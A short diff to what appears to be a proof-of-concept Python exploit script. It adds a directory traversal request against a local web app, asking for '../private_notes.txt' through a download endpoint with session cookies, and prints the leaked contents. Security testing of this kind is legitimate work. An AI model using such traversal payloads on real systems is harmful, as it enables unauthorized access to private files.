@@ -38,4 +38,14 @@ print("__________")
 
 print("status:", response.status_code)
 
+print(f"{CYAN}--- time to access data/private_notes.txt ---{RESET}")
 
+targeturl = "http://localhost:4942/projects/download?file=../private_notes.txt"
+ 
+response = requests.get(targeturl, cookies=cookies)
+print("__________")
+print("response text of private notes:\n")
+print(response.text)
+print("__________")
+
+print("status:", response.status_code)
